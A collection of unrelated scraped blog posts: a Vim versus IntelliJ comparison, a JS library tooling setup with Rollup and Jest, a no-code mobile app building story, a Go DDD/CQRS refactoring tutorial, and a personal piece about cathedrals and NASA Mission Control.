<p>I also had a long affair with WebStorm, which was mostly great. I did; however, find it odd to be using an editor <strong>ONLY</strong> made for a few programs. If I wanted to run a Ruby on Rails app in Webstorm, I was SOL. I thought it was a little silly to run RubyMine, Webstorm, and Pycharm on one machine. If I wrote code in all three languages, shouldn’t one editor be able to handle it?</p>
<p>Eventually I wound up running IntelliJ with plugins that handle any programming need I may have. And for now, I am very happy. There are, of course, many cons with IntelliJ. But I truly believe the Pros outweigh the Cons.</p>
<h2>Vim and IntelliJ, a Pros and Cons list:</h2>
<p>I still think Vim is a great editor and I love to break it out every once in a while. But I believe the pros of IntelliJ outweigh the cons of Vim at this point in my career. Here is an overview of my thought process.</p>
<h3>Pros and Cons of Vim</h3>
<blockquote>
<p>When picking up a new language or framework in Vim, I would spend hours configuring plugins, dealing with linting, and looking up documentation.</p>
</blockquote>
<h4><strong><em>Pros:</em></strong></h4>
<ul>
<li><strong>Minimalist.</strong> All you need is the terminal, and that is it. You don’t need to open multiple windows, Tmux and Vim together were <strong>awesome</strong> for this.</li>
<li><strong>Gets you into the Flow:</strong> . Vim <a href="https://en.wikipedia.org/wiki/Flow_(psychology)">gets me into “The Flow”</a> better than anything. I just need to move my fingers a bit, and I’m in/out of windows, buffers, splits, etc… I specifically remember smiling when I was coding with Vim, because it just felt so fun sometimes.</li>
<li><strong>Extensible:</strong> It’s been around forever, Thoughtbot, Hashrocket, and many community members contributed greatly to it.</li>
</ul>
<h4><strong><em>Cons:</em></strong></h4>
<ul>
<li><strong>Very steep learning curve:</strong> Vim takes a long time to learn, and you’ll never stop learning it. This is not a problem with more experienced users like myself, but I thought it was worth mentioning.</li>
<li><strong>Inconsistent Plugins:</strong> Quick, tell me the best plugin for auto-completion in Vim. ALE/Omnicomplete? YouCompleteMe? VimCompletesMe? DeoPlete? There is an insane number of plugins for any task you may have. And not all plugins play together. This has become slightly better with the emergence of LSPs; however, I constantly find myself playing with plugins to make things work better, only to dislike the setup and go for another mix of plugins later. Having dot files are nice, but when you switch computers/systems, you have to install pip3/python for some packages, node/npm/yarn for others, and for some, you’ll have to cd into the dir where its installed and run a makefile! (looking at you, YouCompleteMe)</li>
<li><strong>Doesn’t always play nice with everything else:</strong> I have had countless configurations with Vim. Vim standalone, NeoVim, Vim with Tmux, and MacVim/GUIVim. They all have strengths and weaknesses, but there is always one thing in common, it doesn’t play very well with every computer system. Try to set up copy+paste on Vim on a Mac, done? Ok great! Now do it for Linux. There are so many workarounds and hacks to get everything to play well together. When you get it set up, its nice, but sometimes its rough. I find myself reading old blog posts to remember how I set up yank + paste on my system-wide clipboard over and over.</li>
<li><strong>Isn’t very fun with complex codebases in complicated languages (like typescript):</strong> I remember starting a new job that used typescript, and there were a lot of engineers working on some really cool problems. After getting Vim/ ENV vars/ etc… all set up, I go to start woking in Vim and <strong>BAM</strong>, any file over 20 lines freezes and its incredibly slow to work with. Sure enough, my javascript parser/highlighting plugin (see my point above about plugins) was not efficient, and it was bogging down everything. So I had to settle for a lesser parser that performed better. A similar thing happens with prettier, eslint, and tsserver. If you need your code to be auto-fixed with these technologies, its blocks read/write. Even when your IO is blocked for only a short amount of time, it makes for a trudging, slow-as-molasses feeling when writing code.</li>
</ul>
<h3>Pros and Cons of IntelliJ</h3>
<blockquote>
<p>All of a sudden, I had everything at my fingertips. Auto completion, Auto formatting, snippets, and documentation lookup was all set <strong>By Default</strong>.</p>
</blockquote>
<h4><strong><em>PROS:</em></strong></h4>
<ul>
<li><strong>Everything is pre-configured:</strong> You don’t have to worry about setting up tags, or YouCompleteMe, or NERDTree. I can’t tell you how many times I open a new project, perhaps in a different language, and everything works great out of the box. It’s a total sigh of relief.</li>
<li><strong>File watchers are powerful:</strong> There is a thing in IntelliJ called file watchers. You can set arbitrary tasks to run after you edit/save/type in a file. This can be super powerful when you have more advanced tasks you need to run in your codebase like: sorting imports, running specific eslint rules, or running rubocop after saving a file.</li>
<li><strong>Everything plays nicely with your OS:</strong>  I can’t tell you how many times I set up Vim and tmux on a new OS, like linux. I’ll run all my dot files, configure anything crazy I missed. Compile the plugins that need compilation. Fix any small issues that happen between Vim/tmux/linux (or Mac, whatever). Then I’m programming, and I have to copy+paste something, and BAM, I lose 4 hours configuring copy and paste correctly between Vim/tmux/</li>
<li><strong>Complicated codebases and languages are handled easily:</strong> After using IntelliJ (or Webstorm), all my problems with my large Typescript codebase went away. Everything gets indexed, parsed, highlighted, and rendered correctly. There are very few hangups when working with complicated codebases, and the exceptions are usually much easier to deal with than with Vim.</li>
</ul>
<h4><strong><em>CONS:</em></strong></h4>
<ul>
<li><strong>Complicated Interface:</strong> The interface to IntelliJ is somewhat, complicated. There are a lot of tools, dropdown menus, and configurations. This is definitely a daunting thing at first, but once you get used to it, its not a big problem at all.</li>
<li><strong>Memory Usage:</strong> IntelliJ does eat up a bit of RAM on my machines. I believe this memory usage is worth it though. You’re paying an upfront price to index, tag, and cache programs, so your editing experience is smooth as butter. VSCode and Vim (with plugins) only do this lazily; therefore, your programming experience with complicated projects becomes very awkward and slow over time.</li>
<li><strong>Difficult configuration for some tasks:</strong> Again, this is something you get used to with time. Some configuration options with IntelliJ are less than ideal. For example, when setting up auto-formatting for eslint, you have to go through a couple hoops to set up a file watcher in IntelliJ. Once you understand this concept though, its fairly straightforward and easy to use with other tools.</li>
</ul>
<p>In the end, I have decided that the pros for IntelliJ greatly outweigh the cons. I have …</p></div></div></div></div></section></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Recently, I was assigned a task of creating a new JS library to replace the obsolete one that's been released for almost 8 years. This is a quite intruiging task because I'm also permitted to try everything new to make this project much more robust. The first thing came to my mind was to have myself a complex but great "development environment" which explains exactly properly vividly why I'm a DX first developer :D. In this article, I'll demonstrate how I made it with a little "hello-world" repo.</p><p>Why the fuss? Is it worth?</p><p>Suppose you are in a war, the battalion chief only gives you the bayonet to battle with the enemies. Do you think you dare to charge forward while your enemies are using machine guns? I bet 99% of us are not brave enough to do so (Please don't tell me you'd like to die for glory).</p><p>So what if the battalion cheif gives you the most lethal weapon that can defeat your enemies with only one click just like Thanos' snap of fingers? I guess now you got the courage to fight against the enemies :P.</p><p>Anyway, I'd like to become that battalion chief providing lethal weapons to my teammates in order to remove the painful part from our development. When our development has become into a joyful experience, I believe the fuss of moving things back and forth is definitely worth of it.</p><p>Okay, here is the link to my demo repo:</p><p><a href="https://github.com/daiyanze/modern-hello-world" target="_blank" rel="nofollow noopener noreferrer">https://github.com/daiyanze/modern-hello-world</a></p><h2 id="the-inspiration"><a href="#the-inspiration">The Inspiration</a></h2><p>For making our great new library a real modern one, I've been doing some research on varieties of modern JS repos.</p><ul><li>Angular</li><li>Vue-next</li><li>Graphql-js</li><li>popper-js</li><li>next.js</li><li>redux</li><li>and some other interesting libraries</li></ul><p>I found that all of these libraries have one thing in common:</p><blockquote><p>They all happen to conincide having either Jest or Mocha/Chai as their testing suites.</p></blockquote><p>Actually Jest and Mocha/Chai have been in the market for years, they are pretty solid. Even there are some new comers like Ava.js, but they still cannot replace the ones with larger community at the momment.</p><p>It's already quite a common sense to choose the libraies with larger communities. Because their code is being tested by many other people, and have more bug fixes. In one word: Almost no one is brave enough to use those librarie that are not being tested thoroughly.</p><blockquote><p>How to know if a library has a large community?</p></blockquote><p>Simple, just check if they have many Github stars or issues. "Stars" usually means the library is pretty qualified and accepted by developers. "Issues" in some degree refects the community interactivity and library activeness. Those 2 indicators should be very reliable for our technology selection.</p><p>Therefore, I will choose those tools as our devDependencies from Github that have lots of stars and issues.</p><h2 id="dependency-features"><a href="#dependency-features">Dependency Features</a></h2><p>Here are some of the mayjor ("must") features for our new project. In my opinion, these features have somewhat been the technology selection standard for a new JS library to start up with in 2020.</p><h3 id="1-typescript"><a href="#1-typescript">1. Typescript</a></h3><p>Writing code without types was actually a pain in the ass, "TypeError" will surely appear if we don't think of our data type in advance. So nowadays, since Typescript has become into quite a standard or convention of almost all of the new born JS libraries. Without a doubt, this feature is a "must" to our project.</p><h3 id="2-jest"><a href="#2-jest">2. Jest</a></h3><p>Test is another thing that a JS project cannot live without. I believe not a team leader will choose a technology that's not even being tested by itself. So Jest is certainly the utility that we need for tests, as you know they got a big community.</p><h3 id="3-prettier"><a href="#3-prettier">3. Prettier</a></h3><p>Unifying the team's coding style is time-saving. It matters the most when you are visiting your teammates pull request.</p><p>The first time when I saw this tool was 2017. Back then, there was almost no JS code formatters in the open market. Well, Prettier made it available. You can format the code the way you hope it should look like.</p><p>And what's more, with the help of ESlinter or TSlinter the editor could become into a really cool stuff for JS developers.</p><p>The reason to adopt such tools is simple because:</p><blockquote><p>They give you hints!</p></blockquote><p>Just take a look at the <a href="https://github.com/airbnb/javascript" target="_blank" rel="nofollow noopener noreferrer">Airbnb's javascript style guide</a> which was created 7 years ago, you'll know how important the code style is.</p><h3 id="4-husky--conventional-changelog"><a href="#4-husky--conventional-changelog">4. Husky &amp; Conventional-changelog</a></h3><p>I think everyone has the following insatiable wishes.</p><blockquote><p>I wish my project can spit out the changelog automatically.
I wish the commit format can be united.
I wish ...</p></blockquote><p>These tools may sound stange to you. But they are actually a great combination to generate stable changelogs automatically based on the git commit messages. Angular project is using this approach to create better changelogs.</p><p>Take a look at the Angular's beatiful changelog:</p><pre><code>11.0.0-next.3 (2020-09-23)

Bug Fixes

common: add params and reportProgress options to HttpClient.put() overload (#37873) (dd8d8c8), closes #23600
compiler-cli: generate let statements in ES2015+ mode (#38775) (123bff7)
core: ensure TestBed is not instantiated before override provider (#38717) (c8f056b)
forms: type NG_VALUE_ACCESSOR injection token as array (#29723) (2b1b718), closes #29351
Features

common: Add ISO week-numbering year formats support to formatDate (#38828) (984ed39)
compiler: Parse and recover on incomplete opening HTML tags (#38681) (6ae3b68), closes #38596
router: add migration to update calls to navigateByUrl and createUrlTree with invalid parameters (#38825) (7849fdd), closes #38227
service-worker: add the option to prefer network for navigation requests (#38565) (a206852), closes #38194
BREAKING CHANGES

core: If you call TestBed.overrideProvider after TestBed initialization, provider overrides are not applied. This behavior is consistent with other override methods (such as TestBed.overrideDirective, etc) but they throw an error to indicate that, when the check was missing in the TestBed.overrideProvider function. Now calling TestBed.overrideProvider after TestBed initialization also triggers an error, thus there is a chance that some tests (where TestBed.overrideProvider is called after TestBed initialization) will start to fail and require updates to move TestBed.overrideProvider calls before TestBed initialization is completed.</code></pre><blockquote><p>Just don't write the changelog yourself. Let the machines handle them.</p></blockquote><p>Okay, these 4 tools are basically the features I'm really really eager for as a "DX-first" developer. There are of course some other nice features to have, but I think it's already enough to start with at the moment. After all, new more tools will increase the learning time for each of our members.</p><h2 id="the-rollup"><a href="#the-rollup">The "Rollup"</a></h2><p>While I was prototyping my repository, I never thought that Rollup would be the biggest challenge to me. Rollup has a great document which you would understand what it hopes you to do immediately just by looking at the examples. But the true problems locate at how I should handle my output files.</p><p>Since my output is a library, I need to rollup all my sources into one JS file that can be used within a browser (or maybe Node.js). This can be easily done by Gulp or Grunt with some plugins. I'm pretty new to this magical tool that has enpowered the most famous frameworks like Vue and React.</p><p>Frankly speaking, I don't know much about how I should move next.</p><p>In order to save those steps of moving back and forth, I gave up on exploring the Rollup configurations. As you could imagine, there's no way for a "noob" to create something "great" from completely zero.</p><p>Alright, then. Let me try another approach.</p><blockquote><p>If I don't know how to do it, then somebody else should know.</p></blockquote><p>Vue and React have already done the homework, the rest is me copying them :D.
(Very proud of being a copycat~)</p><p>I chose <a href="https://github.com/vuejs/vue-next" target="_blank" rel="nofollow noopener noreferrer">Vue 3.0</a> to be my targeted repo because it's quite a new project. And Vue currently has a very high popularity.</p><p>Its configuration is a bit complex, but still very easy to understand.</p><pre><code>

But I replaced one of the Rollup plugins because I personally favor the official packages.</p><ul><li>Changed <code>rollup-plugin-typescript</code> to the official <code>@rollup/plugin-typescript</code></li></ul><p>Vue provides various types of builds which I think is a smart move, because the users will have different development purposes and environment.</p><p>For now, we could see that Vue offers the following types of build outputs based on the output format of JS code (<code>es</code> &amp; <code>cjs</code> &amp; <code>iife</code>). The ones with a <code>prod</code> in the file name is used for production purposes:</p><pre><code>

vue.cjs.js
vue.cjs.prod.js
vue.d.ts
vue.esm-browser.js
vue.esm-browser.prod.js
vue.esm-bundler.js
vue.global.js
vue.global.prod.js
vue.runtime.esm-browser.js
vue.runtime.esm-browser.prod.js
vue.runtime.esm-bundler.js
vue.runtime.global.js
vue.runtime.global.prod.js</code></pre><p>I hope that this approach can be applied in our project. Similarly but differently, the build outputs with a <code>dev</code> in the file name is the ones for development.</p><p>And what's more, we don't really separate the builds like Vue by judging if it's the <code>runtime</code> or not. So the following outputs are the final targets.</p><pre><code>

helloworld.cjs.js 
helloworld.cjs.dev.js
helloworld.d.ts</code></pre></div></div>

In this article, I am going to share the whole process of building a mobile app and explain how to upload it into&nbsp;<a href="https://www.apple.com/app-store/">AppStore</a>&nbsp;and&nbsp;<a href="https://play.google.com/">Play Market</a>&nbsp;with no coding skills.<p><strong>The origins</strong></p><p>When COVID-19 started, one of my friends reached out to me to build a mobile app for him.</p><p>His idea was to create an Uber-type platform to connect patients with doctors via a video interface.</p><p>The only problem was that I couldn’t write any code.</p><p>Why did this friend contact me? Well, I have previously built some landing pages for him using <a href="https://tilda.cc/">Tilda</a> and <a href="https://www.wix.com/">Wix</a>. But I had never built anything similar to mobile apps.</p><p>But why not?</p><p>I asked myself: if there are services that make it easy to create landing pages like Wix or WordPress, there should be an easier way to develop mobile apps.</p><p>Guess what? I was right!</p><p><strong>Choosing the right platform for building</strong></p><p>According to <a href="https://welovenocode.com/nocodelist" target="_blank">Nocode Tools List</a>, there are more than 30+ “No-code” apps for creating mobile-like apps.</p><p>I did a little research to understand how they are different. I soon discovered that many of the no-code platforms could not publish apps in the App Store and Google Play.</p><p>Here are the results of my research:</p><figure data-alt="" data-src="https://static.tildacdn.com/tild6632-6564-4561-a530-616330353564/Screenshot_2020-10-1.png" data-href="" data-new-tab="" contenteditable="false"><img src="https://static.tildacdn.com/tild6632-6564-4561-a530-616330353564/Screenshot_2020-10-1.png" alt=""></figure><br>Links: <a href="https://thunkable.com/?ref=welovenocode.com">Thunkable</a>, <a href="https://www.appsheet.com/?ref=welovenocode.com">Appsheet</a>, <a href="https://bubble.io/?ref=welovenocode.com">Bubble</a>, <a href="https://www.adalo.com/?ref=welovenocode.com">Adalo</a>, <a href="https://www.glideapps.com/?ref=welovenocode.com">Glide</a><p>The app I was trying to build needed to have the ability to call with patients. This is not a straightforward function at all.</p><p>So for me, Glide, Adalo, and app sheet were useless. I then had to choose between Bubble and Thunkable.</p><p>I decided to build with Bubble as I had some experience using it, and it was a little easier for me than Thunkable.</p><p>Bubble has a pretty easy way of building anything without code using their own UI-friendly interface like this:</p><figure data-alt="" data-src="https://static.tildacdn.com/tild3539-3833-4539-b135-343039333033/Screenshot_2020-10-1.png" data-href="" data-new-tab="" contenteditable="false"><img src="https://static.tildacdn.com/tild3539-3833-4539-b135-343039333033/Screenshot_2020-10-1.png" alt=""></figure><p>You simply select the blocks you want your app to be consisted of and build by drag-and-drop.<br>So I decided to build a mobile-optimised website (PWA) using Bubble and then... Convert it into the mobile app!</p><p><strong>Wait, but what is PWA?</strong></p><p>PWA is a progressive web application… blah, blah, blah. It was hard for me to understand what PWA means.</p><p>In simple terms, PWA is a website (the same you are currently using reading this article) but optimized for mobile. PWA is not a mobile application itself, but it can be wrapped inside a “container” in an app.</p><p>Wow… Too hard! A website wrapped inside of an app? Yes! You can create a website with any no-code tool for web projects and convert it into the app in a few single steps.</p><p><strong>Building</strong></p><p>Building the app was not an easy process, even if it was codeless. Creating a form with some sort of a list will take you a few hours. But I was building an app that could accept payments and connect users through a video-camera.</p><p>I chose Twilio for handling the video communication and Stripe as a payment processor.<br>For me, besides these more complex issues I faced, the other functionalities were more straightforward. Fortunately, I was able to successfully built the app.</p><p>After the first week, the app looked like this:</p><figure data-alt="" data-src="https://static.tildacdn.com/tild3537-3662-4638-b834-666635623037/2020-10-07_190723.jpg" data-href="" data-new-tab="" contenteditable="false"><img src="https://static.tildacdn.com/tild3537-3662-4638-b834-666635623037/2020-10-07_190723.jpg" alt=""></figure><br>After the second week, it looked like this:<figure data-alt="" data-src="https://static.tildacdn.com/tild3232-6634-4530-b536-393435633830/Screenshot_2020-10-0.png" data-href="" data-new-tab="" contenteditable="false"><img src="https://static.tildacdn.com/tild3232-6634-4530-b536-393435633830/Screenshot_2020-10-0.png" alt=""></figure><p>Using No code apps is a lot simpler than actual coding. For me, it is relatively easy.<br>This article does not explain the process itself as you will find more relevant posts on the Internet. I will explain the most challenging part.</p><p><strong>What should you do after you build a PWA app?</strong></p><p>Here is where the magic begins. I have spent around three weeks (that’s even more than building itself) searching a way to upload my app to the App Store.</p><p>On the Internet, you’ll find a considerable number of “containers” that can wrap your PWA app and enable you to upload your app to the App Store and Google Play.</p><p>The only problem is if you are not a coder, it can be complicated for you to do it.</p><p>To help you, I have prepared this diagram that highlights some challenges you might face:</p><figure data-alt="" data-src="https://static.tildacdn.com/tild6232-6330-4633-b263-326264663562/Screenshot_2020-10-1.png" data-href="" data-new-tab="" contenteditable="false"><img src="https://static.tildacdn.com/tild6232-6330-4633-b263-326264663562/Screenshot_2020-10-1.png" alt=""></figure><p>As you can see in the diagram, there are many recommendations on which approach you could take.</p><p>I hired a freelancer for $100 to wrap my app into the container and upload it to the App Store.<br>However, you don’t have to hire anyone if you are a developer.</p><p>If you are not a developer and don’t want to search for a freelancer, just google “convert website to app.” Many companies will convert your website for $100. But please, DON’T TRY CONVERTIFY.</p><p>Based on my poor experience with them, I can share that they are not the best option at all, who spend a massive amount of money on marketing to be on top of Google search.</p><p><strong>Final steps</strong></p><p>Okay, now you have your website and a container ready to launch.</p><p>Android: If you want to publish In Google Play - that’s relatively simple. Just go to <a href="https://play.google.com/apps/publish/signup/">this page</a>, pay for the developer license ($25), and upload the app.</p><p>Need help with it? Just go to their <a href="https://support.google.com/googleplay/android-developer/?hl=en#topic=3450769">support forum</a> or contact Google support directly.</p><p>IOS: if you want to publish your app to the App Store, just go <a href="https://developer.apple.com/programs/enroll">here</a> and submit an enrollment. The developer license will cost you $99.</p><p>After Apple approves your request, you’ll have to start uploading. Firstly, you’ll need to upload the app to test flight and later to the App Store.</p><p>Keep in mind that Apple will precisely review your app before you upload it to the App Store.<br>It took me two weeks to fix what they’ve asked me. The irony is they didn’t like that we used “not apple device” on one of the photos inside the app.</p><p>Check <a href="https://developer.apple.com/support/app-store-connect/">this guide</a> if you’ll have any problems;</p><p><strong>Note</strong></p><p>Many people told me that Apple doesn’t allow uploading websites into the App Store. IT IS NOT TRUE. Both the App Store and Google Play don’t care if your app is an actual app or a website.</p><p>The only thing that the Apple Store and Google Play care about is that you use their payment system. Initially, I encountered some technical challenges. I then decided to redirect people to the Browser when they purchase a subscription. And the problem was solved, and everything worked flawlessly.</p><p>If you are curious, the app I was referring to in this article is <a href="https://udoc.io./">Udoc</a><br>Please check out the app and let me know your thoughts.</p><p>After building this app, I have launched a Nocode agency <a href="https://welovenocode.com/">WeLoveNocode</a> and built 10+ apps. If I can help you during the process of developing your apps, please don’t hesitate to reach out to us by booking a call through <a href="https://welovenocode.com/thnx">our website.</a></p></section></div>

November 5, 2020 | https://threedots.tech/post/ddd-cqrs-clean-architecture-combined/ | <a href="https://web.archive.org/web/*/https://threedots.tech/post/ddd-cqrs-clean-architecture-combined/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the <a href="https://threedots.tech/tags/building-business-applications/">previous articles</a>, we introduced techniques like DDD Lite, CQRS, and Clean (Hexagonal) Architecture.
Even if using them alone is beneficial, they work the best together. Like Power Rangers.
Unfortunately, it is not easy to use them together in a real project.
<strong>In this article, I will show you how to connect DDD Lite, CQRS, and Clean Architecture in the most pragmatic and efficient way.</strong></p><h3 id="why-should-i-care">Why should I care?</h3><p>Working on a programming project is similar to planning and building a residential district.
If you know that the district will be expanding in the near future, you need to keep space for future improvements.
Even if at the beginning it may look like a waste of space.
You should keep space for future facilities like residential blocks, hospitals, and temples.
<strong>Without that, you will be forced to destroy buildings and streets to make space for new buildings.</strong>
It’s much better to think about that earlier.</p><p><img src="https://threedots.tech/media/ddd-cqrs-clean-architecture-combined/district-empty.png" alt="Empty district"></p><p>The situation is the same with the code.
If you know that the project will be developed for longer than 1 month, you should keep the long term in mind from the beginning.
<strong>You need to create your code in a way that will not block your future work.
Even if at the beginning it may look like over-engineering and a lot of extra boilerplate, you need to keep in mind the long term.</strong></p><p>It doesn’t mean that you need to plan every feature that you will implement in the future – it’s actually the opposite one.
This approach helps to adapt to new requirements or changing understanding of our domain.
Big up front design is not needed here.
It’s critical in current times, when the world is changing really fast and who can’t adapt to these changes can get simply out of business.</p><p><img src="https://threedots.tech/media/ddd-cqrs-clean-architecture-combined/district-full.png" alt="Full district"></p><p><strong>This is exactly what these patterns give you when they are combined – the ability to keep constant development speed.
Without destroying and touching existing code too much.</strong></p><p>Does it require more thinking and planning?
Is it a more challenging way?
Do you need to have extra knowledge to do that?
Sure!
<strong>But the long term result is worth that!</strong>
Fortunately, you are in the right place to learn that. 😉</p><p>But let’s leave the theory behind us. Let’s go to the code.
In that article, we will skip reasonings for our design choices.
We described these already in <a href="https://threedots.tech/tags/building-business-applications/">the previous articles</a>.
If you did not read them yet, I recommend doing it – you will understand this article better.</p><p>Like in previous articles, we will base our code on refactoring a real open-source project.
This should make the examples more realistic and applicable to your projects.</p><p>Are you ready?</p><h3 id="lets-refactor">Let’s refactor</h3><p>Let’s start our refactoring with the <a href="https://threedots.tech/post/ddd-lite-in-go-introduction/#domain-first-approach">Domain-First</a> approach.
We will start with introduction of a <a href="https://threedots.tech/post/introducing-clean-architecture/#the-dependency-inversion-principle">domain layer</a>.
Thanks to that, we will be sure that implementation details do not affect our domain code.
<strong>We can also put all our efforts into understanding the business problem. Not on writing boring database queries and API endpoints.</strong></p><p>Domain-First approach works good for both rescue (refactoring: wink:) and greenfield projects.</p><p>To start building my domain layer, I needed to identify what the application is actually doing.
This article will focus on refactoring of <a href="https://github.com/ThreeDotsLabs/wild-workouts-go-ddd-example/tree/v2.5/internal/trainings" target="_blank"><code>trainings</code></a> Wild Workouts microservice.
I started with identifying use cases handled by the application.
After previous <a href="https://threedots.tech/post/introducing-clean-architecture/">refactoring to Clean Architecture</a>, we can find it in the <a href="https://github.com/ThreeDotsLabs/wild-workouts-go-ddd-example/blob/v2.4/internal/trainings/app/training_service.go#L32" target="_blank"><code>TrainingService</code></a>.
When I work with a messy application, I look at RPC and HTTP endpoints to find supported use cases.</p><p>One of functionalities that I identified is the <strong>approval of training reschedule</strong>.
In Wild Workouts, a training reschedule approval is required if it was requested less than 24h before its date.
If a reschedule is requested by the attendee, the approval needs to be done by the trainer.
When it’s requested by the trainer, it needs to be accepted by the attendee.</p><div><pre><code data-lang="diff"><span>- func (c TrainingService) ApproveTrainingReschedule(ctx context.Context, user auth.User, trainingUUID string) error {
</span><span>-  return c.repo.ApproveTrainingReschedule(ctx, trainingUUID, func(training Training) (Training, error) {
</span><span>-     if training.ProposedTime == nil {
</span><span>-        return Training{}, errors.New("training has no proposed time")
</span><span>-     }
</span><span>-     if training.MoveProposedBy == nil {
</span><span>-        return Training{}, errors.New("training has no MoveProposedBy")
</span><span>-     }
</span><span>-     if *training.MoveProposedBy == "trainer" &amp;&amp; training.UserUUID != user.UUID {
</span><span>-        return Training{}, errors.Errorf("user '%s' cannot approve reschedule of user '%s'", user.UUID, training.UserUUID)
</span><span>-     }
</span><span>-     if *training.MoveProposedBy == user.Role {
</span><span>-        return Training{}, errors.New("reschedule cannot be accepted by requesting person")
</span><span>-     }
</span><span>-
</span><span>-     training.Time = *training.ProposedTime
</span><span>-     training.ProposedTime = nil
</span><span>-
</span><span>-     return training, nil
</span><span>-  })
</span><span>- }
</span></code></pre></div><h3 id="start-with-the-domain">Start with the domain</h3><p>Even if it doesn’t look like the worst code you’ve seen in your life, functions like <code>ApproveTrainingReschedule</code> tend to get more complex over time.
More complex functions mean more potential bugs during future development.</p><p>It’s even more likely if we are new to the project, and we don’t have the <em>“shaman knowledge”</em> about it.
<strong>You should always consider all the people who will work on the project after you, and make it resistant to be broken accidentally by them.
That will help your project to not become the legacy that everybody is afraid to touch.</strong>
You probably hate that feeling when you are new to the project, and you are afraid to touch anything to not break the system.</p><p>It’s not uncommon for people to change their job more often than every 2 years.
That makes it even more critical for long-term project development.</p><p>If you don’t believe that this code may become complex, I recommend checking the Git history of the worst place in the project you work on.
In most cases, that worst code started with <em>“just a couple simple ifs”</em>. 😉
The more complex the code will be, the more difficult it will be to simplify it later.
<strong>We should be sensitive to emerging complexity and try to simplify it as soon as we can.</strong></p><h4 id="training-domain-entity"><code>Training</code> domain entity</h4><p>During analyzing the current use cases handled by the <code>trainings</code> microservice, I found that they are all related to a <em>training</em>.
It is pretty natural to create a <code>Training</code> type to handle these operations.</p><p><img src="https://threedots.tech/media/ddd-cqrs-clean-architecture-combined/training-svc-methods.jpg" alt="Service methods"></p><div><pre><code data-lang="go"><span>package</span> <span>training</span>

</code></pre></div><h3 id="refactoring-of-training-cancelation">Refactoring of training cancelation</h3><p>Let’s now take a look at <code>CancelTraining</code> from <code>TrainingService</code>.</p><p>The domain logic is simple there: you can cancel a training up to 24h before its date.
If it’s less than 24h before the training, and you want to cancel it anyway:</p><ul><li>if you are the trainer, the attendee will have his training “back” plus one extra session (nobody likes to change plans on the same day!)</li><li>if you are the attendee, you will lose this training</li></ul><p>This is how the current implementation looks like:</p><div><pre><code data-lang="diff"><span>- func (c TrainingService) CancelTraining(ctx context.Context, user auth.User, trainingUUID string) error {
</span><span>-  return …</span></code></pre></div></div></div>

				<div><p>When I think of “cathedrals”, I think of large, imposing, usually European or English Gothic church buildings.</p>
<p>I’ve been so very fortunate to check off my bucket list some of the most amazing cathedrals in the world – <a href="https://balettie.com/zenphoto/albums/vacation-photos/italy-and-mediterranean-cruise-2005/rome-day-2-the-vatican/St.%20Peter's%20Basilica.jpg" data-rel="lightbox-gallery-dDUGFtmW" data-rl_title="" data-rl_caption="" title="">St. Peter’s Basilica</a> in Rome, <a href="https://balettie.com/zenphoto/albums/vacation-photos/england-2015/19may15-london-day-1-westminster-london-eye-/westminster-abbey-front.jpg" data-rel="lightbox-gallery-dDUGFtmW" data-rl_title="" data-rl_caption="" title="">Westminster Abbey</a> in London, <a href="https://balettie.com/zenphoto/albums/miscellaneous-photos/germany-tdy-2001/germany-regensburg-25aug01-/cathedral-3.jpg" data-rel="lightbox-gallery-dDUGFtmW" data-rl_title="" data-rl_caption="" title="">St. Peter’s Cathedral</a> in Regensburg, Germany, <a href="https://balettie.com/zenphoto/albums/vacation-photos/new-york-2004/21dec04-more-nyc-sights/St.%20Patrick%27s%20Cathedral.jpg" data-rel="lightbox-gallery-dDUGFtmW" data-rl_title="" data-rl_caption="" title="">St. Patrick’s</a> in New York, <a href="https://balettie.com/zenphoto/albums/vacation-photos/new-orleans-2008/jackson-square/St.%20Louis%20Cathedral%20and%20Andrew%20Jackson%20statue.jpg" data-rel="lightbox-gallery-dDUGFtmW" data-rl_title="" data-rl_caption="" title="">St. Louis</a> in New Orleans, and the <a href="https://balettie.com/zenphoto/albums/vacation-photos/washington-d.c.-2008/national-cathedral/Rose%20Window.jpg" data-rel="lightbox-gallery-dDUGFtmW" data-rl_title="" data-rl_caption="" title="">National Cathedral</a> in Washington, D.C.&nbsp; In the image to the right, an actual piece of the Moon is embedded in the stained glass at the Washington National Cathedral.&nbsp; The full <a href="https://balettie.com/zenphoto/albums/vacation-photos/washington-d.c.-2008/national-cathedral/Moon%20Rock%20window%20(3).jpg" data-rel="lightbox-gallery-dDUGFtmW" data-rl_title="" data-rl_caption="" title="">“Moon Rock Window”</a> is quite stunning.</p>
<p>I still need to see so many, and I’m heartbroken that I wasn’t able to see Notre Dame before the recent fire. Fortunately, it looks like we may have dodged a bullet and that may still be an option after they reconstruct the roof and restore the interior!</p>
<p>You may not realize, but the <a href="https://www.merriam-webster.com/dictionary/cathedral" target="_blank" rel="noopener noreferrer nofollow">adjective form of cathedral</a> is “<em>of, relating to, or containing a cathedra</em>“. A <a href="https://www.merriam-webster.com/dictionary/cathedra" target="_blank" rel="noopener noreferrer nofollow">cathedra</a> is the “a bishop’s official throne”, which even today is a VERY impressive and formal seat that is in a place of honor.</p>
<p>It’s the more modern adaptation and extension of the word, though, that has evolved to include any substantially important facility to a particular group of people.&nbsp; Various sporting venues around the world have been called cathedrals of (insert sport name here) at one time or another.&nbsp;&nbsp;</p></div>

				<p>NASA’s <a href="https://balettie.com/mcc/">Mission Control</a> at the Johnson Space Center in Houston has been called “The Cathedral of Manned Spaceflight”. Chris Kraft, the original MCC Flight Director, coined the phrase some years later in his book “Flight: My Life in Mission Control” (<a href="https://www.amazon.com/Flight-My-Life-Mission-Control/dp/0525945717/ref=tmm_hrd_swatch_0?_encoding=UTF8&amp;qid=&amp;sr=" target="_blank" rel="noopener noreferrer nofollow">available via Amazon</a> and other sellers).&nbsp;&nbsp;</p>

				<div><p>Like many of you fine readers, I’ve seen the historical photos of the MCC during the Apollo era. As we approach the 50th anniversary of the Apollo 11 Moon landing, it really strikes me with the realization that my first encounter with “The Cathedral” was only 17 years after that first “One Small Step…”</p>
